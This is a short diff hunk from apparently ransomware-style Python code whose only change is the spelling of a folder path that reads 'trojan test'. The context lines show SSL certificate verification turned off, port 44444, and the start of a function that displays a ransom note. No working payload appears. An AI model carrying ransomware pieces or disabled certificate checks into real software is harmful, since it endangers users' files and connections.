@@ -12,7 +12,7 @@ PORT = 44444
 
 context = ssl._create_unverified_context()
 
-folder = "D:\\טרויאני בדיקה"
+folder = "D:\\טרוייני בדיקה"
 
 def show_ransom_note_encryption():
     note = """
